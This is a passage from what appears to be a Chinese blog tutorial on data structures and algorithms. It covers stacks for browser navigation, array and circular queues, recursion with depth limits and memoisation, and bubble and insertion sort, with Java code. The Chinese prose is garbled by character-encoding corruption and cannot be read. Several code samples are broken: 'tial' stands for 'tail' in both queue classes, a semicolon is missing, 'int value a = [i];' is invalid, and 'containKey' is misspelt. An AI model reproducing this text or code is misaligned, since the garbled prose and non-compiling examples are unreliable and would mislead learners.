ä¾æ¬¡è®¿é—®å®Œä¸€ä¸²é¡µé¢a-b-cä¹‹åï¼Œç‚¹å‡»æµè§ˆå™¨çš„åé€€æŒ‰é’®ï¼Œå°±å¯ä»¥çœ‹åˆ°bå’Œaã€‚å½“ä½ åé€€åˆ°aï¼Œç‚¹å‡»å‰è¿›ï¼Œå°±å¯ä»¥é‡æ–°æŸ¥çœ‹bå’Œcã€‚ä½†æ˜¯ï¼Œå¦‚æœä½ åé€€åˆ°båï¼Œç‚¹å‡»äº†æ–°çš„é¡µé¢dï¼Œå°±æ— æ³•é€šè¿‡å‰è¿›ã€åé€€åŠŸèƒ½æŸ¥çœ‹cäº†ã€‚</p><p>å½“ä½ é¡ºåºçœ‹äº†a,b,cä¸‰ä¸ªé¡µé¢ï¼Œä¾æ¬¡æŠŠa,b,cå‹å…¥æ ˆXã€‚é€šè¿‡æµè§ˆå™¨çš„åé€€æŒ‰é’®ï¼Œä»é¡µé¢cé€€åˆ°é¡µé¢aï¼Œæˆ‘ä»¬ä¾æ¬¡æŠŠc,bä»æ ˆXä¸­å¼¹å‡ºï¼Œå¹¶ä¸”ä¾æ¬¡æ”¾å…¥æ ˆYã€‚<br><img src="/2019/03/14/LeetCode-æ•°æ®ç»“æ„ä¸ç®—æ³•/8.jpg" style="max-width: 500px"></p><p>è¿™æ—¶ï¼Œä½ åœ¨bé¡µé¢ä¸Šè·³è½¬åˆ°æ–°é¡µé¢dï¼Œé¡µé¢cå°±æ— æ³•å†é€šè¿‡å‰è¿›ã€åé€€æŒ‰é’®é‡å¤æŸ¥çœ‹äº†ï¼Œæ‰€ä»¥æ¸…ç©ºæ ˆYã€‚<br><img src="/2019/03/14/LeetCode-æ•°æ®ç»“æ„ä¸ç®—æ³•/9.jpg" style="max-width: 500px"></p><p><br><br><br></p><h3 id="4-é˜Ÿåˆ—"><a href="#4-é˜Ÿåˆ—" class="headerlink" title="4. é˜Ÿåˆ—"></a>4. é˜Ÿåˆ—</h3><p>å…ˆè¿›è€…æ–°å‡ºï¼Œå’Œæ ˆç›¸ä¼¼ï¼Œé˜Ÿåˆ—æœ‰ä¸¤ä¸ªåŸºæœ¬æ“ä½œï¼šå…¥é˜Ÿï¼Œæ”¾ä¸€ä¸ªæ•°æ®åˆ°é˜Ÿåˆ—å°¾éƒ¨ï¼›å‡ºé˜Ÿï¼Œä»é˜Ÿåˆ—å¤´éƒ¨å–ä¸€ä¸ªå…ƒç´ ã€‚</p><p><br></p><ul><li><em>ç”¨æ•°ç»„å®ç°é˜Ÿåˆ—</em></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayQueue</span></span>&#123;</span><br><span class="line">  <span class="comment">// æ•°ç»„ items, æ•°ç»„å¤§å° n</span></span><br><span class="line">  <span class="keyword">private</span> String[] items;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// head è¡¨ç¤ºé˜Ÿå¤´ä¸‹æ ‡; tail è¡¨ç¤ºé˜Ÿå°¾ä¸‹æ ‡</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> head = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç”³è¯·ä¸€ä¸ªå¤§å°ä¸ºcapacityçš„æ•°ç»„</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">ArrayQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">    items = <span class="keyword">new</span> String[capacity];</span><br><span class="line">    n = capacity;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å…¥é˜Ÿ</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(String item)</span></span>&#123;</span><br><span class="line">    <span class="comment">// tail == n è¡¨ç¤ºé˜Ÿåˆ—æœ«å°¾æ²¡æœ‰ç©ºé—´äº†</span></span><br><span class="line">    <span class="keyword">if</span> (tail == n) &#123;</span><br><span class="line">      <span class="comment">// tail == n &amp;&amp; head == 0 è¡¨ç¤ºæ•´ä¸ªé˜Ÿåˆ—å æ»¡äº†</span></span><br><span class="line">      <span class="keyword">if</span> (head == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      <span class="comment">// æ•°æ®æ¬ç§»</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = head; i &lt; tail; i++)&#123;</span><br><span class="line">        items[i-head] = items[i]</span><br><span class="line">      &#125;;</span><br><span class="line">      <span class="comment">// æ•°æ®æ¬ç§»åé‡æ–°æ›´æ–°headå’Œtail</span></span><br><span class="line">      tail -= head;</span><br><span class="line">      head = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    items[tail] = item;</span><br><span class="line">    ++tail;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å‡ºé˜Ÿ</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">dequeue</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// head == tail è¡¨ç¤ºé˜Ÿåˆ—ä¸ºç©º</span></span><br><span class="line">    <span class="keyword">if</span> (head == tial) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    String ret = items[head];</span><br><span class="line">    ++head;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹äºæ ˆæ¥è¯´ï¼Œæˆ‘ä»¬åªéœ€è¦ä¸€ä¸ª<strong>æ ˆé¡¶æŒ‡é’ˆ</strong>ã€‚ä½†æ˜¯é˜Ÿåˆ—éœ€è¦ä¸¤ä¸ªæŒ‡é’ˆï¼šä¸€ä¸ªæ˜¯headæŒ‡é’ˆï¼ŒæŒ‡å‘é˜Ÿå¤´ï¼›ä¸€ä¸ªæ˜¯tailæŒ‡é’ˆï¼ŒæŒ‡å‘é˜Ÿå°¾ã€‚<br><img src="/2019/03/14/LeetCode-æ•°æ®ç»“æ„ä¸ç®—æ³•/10.jpg" style="max-width: 600px"></p><p><br></p><ul><li><em>å¾ªç¯é˜Ÿåˆ—ï¼šé¿å…æ•°æ®æ¬ç§»</em></li></ul><p>é˜Ÿæ»¡æ—¶ï¼Œ<code>(tail+1)%n=head</code>ã€‚å¯ä»¥å‘ç°ï¼Œé˜Ÿæ»¡æ—¶ï¼Œå›¾ä¸­çš„tailæŒ‡å‘çš„ä½ç½®å®é™…ä¸Šæ˜¯æ²¡æœ‰å­˜å‚¨æ•°æ®çš„ã€‚æ‰€ä»¥ï¼Œå¾ªç¯é˜Ÿåˆ—ä¼šæµªè´¹ä¸€ä¸ªå­˜å‚¨ç©ºé—´ã€‚<br><img src="/2019/03/14/LeetCode-æ•°æ®ç»“æ„ä¸ç®—æ³•/11.jpg" style="max-width: 600px"><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CircularQueue</span></span>&#123;</span><br><span class="line">  <span class="comment">// æ•°ç»„ items, æ•°ç»„å¤§å° n</span></span><br><span class="line">  <span class="keyword">private</span> String[] items;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> head = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> tail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ç”³è¯·ä¸€ä¸ªå¤§å°ä¸ºcapacityçš„æ•°ç»„</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">CircularQueue</span><span class="params">(<span class="keyword">int</span> capacity)</span></span>&#123;</span><br><span class="line">    items = <span class="keyword">new</span> String[capacity];</span><br><span class="line">    n = capacity;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å…¥é˜Ÿ</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">enqueue</span><span class="params">(String item)</span></span>&#123;</span><br><span class="line">    <span class="comment">// é˜Ÿåˆ—æ»¡äº†</span></span><br><span class="line">    <span class="keyword">if</span> ((tail + <span class="number">1</span>) % n == head) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    items[tail] = item;</span><br><span class="line">    tial = (tial + <span class="number">1</span>) % n;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å‡ºé˜Ÿ</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">dequeue</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// å¦‚æœ head == tial è¡¨ç¤ºé˜Ÿåˆ—ä¸ºç©º</span></span><br><span class="line">    <span class="keyword">if</span> (head == tail) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    String ret = items[head];</span><br><span class="line">    head = (head + <span class="number">1</span>) % n;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>é˜»å¡é˜Ÿåˆ—ï¼š ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å‹<br>å½“é˜Ÿåˆ—ä¸ºç©ºçš„æ—¶å€™ï¼Œå› ä¸ºæ²¡æœ‰æ•°æ®å¯å–ï¼Œä»é˜Ÿå¤´å–æ•°æ®ä¼šè¢«é˜»å¡ã€‚å½“é˜Ÿåˆ—å·²ç»æ»¡äº†ï¼Œæ’å…¥æ•°æ®çš„æ“ä½œå°±ä¼šè¢«é˜»å¡ï¼ŒçŸ¥é“é˜Ÿåˆ—ä¸­æœ‰ç©ºé—²ä½ç½®åæ‰èƒ½æ’å…¥æ•°æ®ã€‚</li></ul><p><br><br><br></p><h3 id="5-é€’å½’"><a href="#5-é€’å½’" class="headerlink" title="5. é€’å½’"></a>5. é€’å½’</h3><p>é€’å½’å°±æ˜¯ç”¨æ ˆçš„æ•°æ®ç»“æ„ï¼ŒåŠ ä¸Šä¸€ä¸ªç®€å•çš„é€»è¾‘ç®—æ³•å®ç°äº†ä¸šåŠ¡åŠŸèƒ½ã€‚æ‰€æœ‰çš„é€’å½’é—®é¢˜éƒ½å¯ä»¥ç”¨é€’æ¨å…¬å¼æ¥è¡¨ç¤ºã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f(n) = f(n - 1) + 1; å…¶ä¸­f(1) = 1;</span><br></pre></td></tr></table></figure></p><p>f(n)è¡¨ç¤ºä½ æƒ³çŸ¥é“è‡ªå·±åœ¨å“ªä¸€æ’ï¼Œf(n-1)è¡¨ç¤ºå‰é¢ä¸€æ’çš„æ’æ•°ï¼Œf(1)=1è¡¨ç¤ºç¬¬ä¸€æ’çš„äººçŸ¥é“è‡ªå·±åœ¨ç¬¬ä¸€æ’ã€‚æœ‰äº†è¿™ä¸ªé€’æ¨å…¬å¼ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°é€’å½’ä»£ç <br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> f(n-<span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><ul><li><em>å†™å‡ºé€’æ¨å…¬å¼ï¼Œæ‰¾åˆ°ç»ˆæ­¢æ¡ä»¶</em></li></ul><p>å‡è®¾æœ‰nä¸ªå°é˜¶ï¼Œæ¯æ¬¡ä½ å¯ä»¥è·¨1æˆ–2ä¸ªå°é˜¶ï¼Œé—®èµ°è¿™nä¸ªå°é˜¶å…±æœ‰å¤šç§ç§èµ°æ³•ï¼Ÿå®é™…ä¸Šï¼Œå¯ä»¥æ ¹æ®ç¬¬ä¸€æ­¥çš„èµ°æ³•æŠŠæ‰€æœ‰èµ°æ³•åˆ†ä¸ºä¸¤ç±»ï¼Œä¸€ç±»æ˜¯å…ˆèµ°1é˜¶åï¼Œn-1ä¸ªå°é˜¶çš„èµ°æ³• + å…ˆèµ°2é˜¶åï¼Œn-2ä¸ªå°é˜¶çš„èµ°æ³•ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f(n) = f(n-1) + f(n-2)</span><br></pre></td></tr></table></figure></p><p>å½“æœ‰1ä¸ªå°é˜¶ä¸”èµ°1é˜¶ï¼Œæˆ–æœ‰2ä¸ªå°é˜¶èµ°2é˜¶æ—¶ï¼Œå³f(1) = 1, f(2) = 2ï¼Œå°±ä¸éœ€è¦å†é€’å½’ã€‚æœ€ç»ˆçš„é€’å½’ä»£ç æ˜¯è¿™æ ·çš„ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">return</span> f(n-<span class="number">1</span>) + f(n-<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><ul><li><p>è­¦æƒ•æ ˆå †æº¢å‡º<br>æ¯è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œéƒ½ä¼šå°†ä¸´æ—¶å˜é‡å°è£…ä¸ºæ ˆå¸§å‹å…¥å†…å­˜æ ˆï¼Œç­‰å‡½æ•°æ‰§è¡Œå®Œæˆè¿”å›æ—¶ï¼Œæ‰å‡ºæ ˆã€‚å¦‚æœé€’å½’æ±‚è§£çš„æ•°æ®è§„æ¨¡å¾ˆå¤§ï¼Œè°ƒç”¨å±‚æ¬¡å¾ˆæ·±ï¼Œä¸€ç›´å‹å…¥æ ˆï¼Œå°±ä¼šæœ‰å †æ ˆæº¢å‡ºçš„é£é™©ï¼ˆéœ€è¦è€ƒè™‘è¿™éƒ¨åˆ†çš„ç©ºé—´å¼€é”€ï¼‰ã€‚å¯ä»¥é™åˆ¶é€’å½’è°ƒç”¨çš„æœ€å¤§æ·±åº¦æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> depth = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  ++depth;</span><br><span class="line">  <span class="keyword">if</span>(depth &gt; <span class="number">10000</span>) <span class="keyword">throw</span> exception;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> f(n-<span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>è­¦æƒ•é‡å¤è®¡ç®—<br>ä»å›¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç›´è§‚åœ°çœ‹åˆ°ï¼Œæƒ³è¦è®¡ç®—f(5)ï¼Œéœ€å…ˆè®¡ç®—f(4)å’Œf(3)ã€‚è®¡ç®—f(4)è¿˜è¦è®¡ç®—f(3)ã€‚å› æ­¤ï¼Œf(3)è¢«è®¡ç®—äº†å¾ˆå¤šæ¬¡ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ä¸ªæ•£åˆ—è¡¨æ¥ä¿å­˜å·²ç»æ±‚è§£è¿‡çš„f(k)ã€‚å½“é€’å½’è°ƒç”¨f(k)ï¼Œå¦‚æœå·²ç»æ±‚è§£è¿‡ï¼Œå¯ä»¥ç›´æ¥ä»æ•£åˆ—è¡¨ä¸­å–å€¼è¿”å›ã€‚<br><img src="/2019/03/14/LeetCode-æ•°æ®ç»“æ„ä¸ç®—æ³•/12.jpg" style="max-width: 500px"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (hasSolvedList.containKey(n))&#123;</span><br><span class="line">    <span class="keyword">return</span> hasSolvedList.get(n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> ret = f(n-<span class="number">1</span>) + f(n-<span class="number">2</span>);</span><br><span class="line">  hasSolvedList.put(n, ret);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æ— é™é€’å½’<br>æ¯”å¦‚demoç¯å¢ƒä¸‹æ•°æ®åº“ä¸­ï¼Œæµ‹è¯•å·¥ç¨‹å¸ˆä¸ºäº†æ–¹ä¾¿æµ‹è¯•ï¼Œä¼šäººä¸ºåœ°æ’å…¥ä¸€äº›æ•°æ®ï¼Œå°±ä¼šå‡ºç°è„æ•°æ®ï¼Œå‡ºç°A-B-C-Aè¿™æ ·çš„æ­»å¾ªç¯ã€‚å¯ä»¥ç”¨é™åˆ¶é€’å½’æ·±åº¦è§£å†³ï¼Œä¹Ÿå¯ä»¥è‡ªåŠ¨æ£€æµ‹A-B-C-Aï¼ˆç”¨æ•£åˆ—è¡¨è®°å½•å·²ç»æŸ¥è¿‡çš„æ•°æ®ï¼‰ã€‚</p></li></ul><p><br><br><br></p><h3 id="6-æ’åº"><a href="#6-æ’åº" class="headerlink" title="6. æ’åº"></a>6. æ’åº</h3><p>åŸåœ°æ’åºï¼šç©ºé—´å¤æ‚åº¦ä¸ºO(1)çš„ç®—æ³•<br>ç¨³å®šæ’åºï¼šç›¸åŒçš„å…ƒç´ åœ¨æ’åºåä¿æŒåŸæœ‰çš„é¡ºåºä¸å˜<br>æœ‰åºåº¦: æ¥è¿‘æœ‰åº/å®Œå…¨æ— åºã€‚<br><em>æœ‰åºåº¦</em>æ˜¯æ•°ç»„ä¸­å…·æœ‰æœ‰åºå…³ç³»çš„å…ƒç´ å¯¹çš„ä¸ªæ•°ã€‚</p><p><br></p><h4 id="6-1-å†’æ³¡æ’åº"><a href="#6-1-å†’æ³¡æ’åº" class="headerlink" title="6.1 å†’æ³¡æ’åº"></a>6.1 å†’æ³¡æ’åº</h4><p>å¯¹ä¸€ç»„æ•°ç»„4,5,6,3,2,1ä»å°åˆ°å¤§è¿›è¡Œæ’åºã€‚<br><img src="/2019/03/14/LeetCode-æ•°æ®ç»“æ„ä¸ç®—æ³•/13.jpg" style="max-width: 500px"></p><p>å†’æ³¡æ’åºåªä¼šæ“ä½œç›¸é‚»çš„ä¸¤ä¸ªæ•°æ®ã€‚æ¯æ¬¡å†’æ³¡æ“ä½œéƒ½ä¼šæ¯”è¾ƒç›¸é‚»çš„ä¸¤ä¸ªå…ƒç´ ï¼Œçœ‹è¦ä¸è¦è®©å®ƒä»¬äº’æ¢ä½ç½®ã€‚ä¸€æ¬¡å†’æ³¡ä¼šè®©è‡³å°‘ä¸€ä¸ªå…ƒç´ ç§»åŠ¨åˆ°å®ƒåº”è¯¥çš„ä½ç½®ï¼Œé‡å¤næ¬¡ï¼Œå°±å®Œæˆäº†nä¸ªæ•°æ®çš„æ’åºå·¥ä½œã€‚<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å†’æ³¡æ’åºï¼Œaè¡¨ç¤ºæ•°ç»„ï¼Œnè¡¨ç¤ºæ•°ç»„å¤§å°</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">    <span class="comment">// æå‰é€€å‡ºå†’æ³¡å¾ªç¯çš„æ ‡å¿—ä½</span></span><br><span class="line">    <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n - i - <span class="number">1</span>; ++j)&#123;</span><br><span class="line">      <span class="keyword">if</span> (a[j] &gt; a[j+<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = a[j];</span><br><span class="line">        a[j] = a[j+<span class="number">1</span>];</span><br><span class="line">        a[j+<span class="number">1</span>] = tmp;</span><br><span class="line">        flag = <span class="keyword">true</span>; <span class="comment">// è¡¨ç¤ºæœ‰æ•°æ®äº¤æ¢</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!flag) <span class="keyword">break</span>;  <span class="comment">// æ²¡æœ‰æ•°æ®äº¤æ¢ï¼Œæå‰é€€å‡º</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å†’æ³¡æ’åºæ˜¯åŸåœ°æ’åºç®—æ³•ï¼Œæ˜¯ç¨³å®šçš„æ’åºç®—æ³•ï¼Œæœ€å¥½æƒ…å†µæ—¶é—´å¤æ‚åº¦æ˜¯O(n)ï¼Œæœ€åæƒ…å†µæ—¶é—´å¤æ‚åº¦æ˜¯O(nÂ²)</p><p><br></p><h4 id="6-2-æ’å…¥æ’åº"><a href="#6-2-æ’å…¥æ’åº" class="headerlink" title="6.2 æ’å…¥æ’åº"></a>6.2 æ’å…¥æ’åº</h4><p>æ’å…¥æ’åºå°†æ•°ç»„ä¸­çš„æ•°æ®åˆ†ä¸ºä¸¤ä¸ªåŒºé—´ï¼Œ<strong>å·²æ’åºåŒºé—´</strong>å’Œ<strong>æœªæ’åºåŒºé—´</strong>ã€‚åˆå§‹å·²æ’åºåŒºé—´åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼Œå°±æ˜¯æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚ç„¶åå–æœªæ’åºåŒºé—´ä¸­çš„å…ƒç´ ï¼Œåœ¨å·²æ’åºåŒºé—´ä¸­æ‰¾åˆ°åˆé€‚çš„ä½ç½®æ’å…¥ï¼Œå¹¶ä¿è¯å·²æ’åºåŒºé—´æ•°æ®ä¸€ç›´æœ‰åºã€‚<br><img src="/2019/03/14/LeetCode-æ•°æ®ç»“æ„ä¸ç®—æ³•/14.jpg" style="max-width: 500px"><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ’å…¥æ’åºï¼Œaè¡¨ç¤ºæ•°ç»„ï¼Œnè¡¨ç¤ºæ•°ç»„å¤§å°</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insertionSort</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; ++i)&#123;</span><br><span class="line">    <span class="comment">// value è¦æ’å…¥çš„å…ƒç´ </span></span><br><span class="line">    <span class="keyword">int</span> value a = [i];</span><br><span class="line">    <span class="keyword">int</span> j = i - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// æŸ¥æ‰¾æ’å…¥çš„ä½ç½®</span></span><br><span class="line">    <span class="keyword">for</span>(; j &gt;= <span class="number">0</span>; --j)&#123;</span><br><span class="line">      <span class="keyword">if</span> (a[j] &gt; value)&#123;</span><br><span class="line">        a[j+<span class="number">1</span>] = a[j];  <span class="comment">// å·²æ’åºåŒºé—´ä¸­æ¯”valueå¤§çš„å…ƒç´ å‡å¾€åç§»ä¸€æ ¼</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    a[j+<span class="number">1</span>] = value; <span class="comment">// æ’å…¥æ•°æ®</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ’å…¥æ’åºæ˜¯åŸåœ°æ’åºç®—æ³•ï¼Œæ˜¯ç¨³å®šçš„æ’åºç®—æ³•ï¼Œæœ€å¥½æƒ…å†µæ—¶é—´å¤æ‚åº¦æ˜¯O(n)ï¼Œæœ€åæƒ…å†µæ—¶é—´å¤æ‚åº¦æ˜¯O(nÂ²)</p><p><br></p><h4 id="6-3-é€‰æ‹©æ’åº"><a href="#6-3-é€‰æ‹©æ’åº" class="headerlink" title="6.3 é€‰æ‹©æ’åº"></a>6.3 é€‰æ‹©æ’åº</h4><p>é€‰æ‹©æ’åºæ¯ä¼šä»æœ«æ’åºåŒºé—´ä¸­æ‰¾åˆ°æœ€å°çš„å…ƒç´ ï¼Œå°†å…¶æ”¾åˆ°å·²æ’åºåŒºé—´çš„æœ«å°¾ã€‚<br><img src="/2019/03/14/LeetCode-æ•°æ®ç»“æ„ä¸ç®—æ³•/15.jpg" style="max-width: 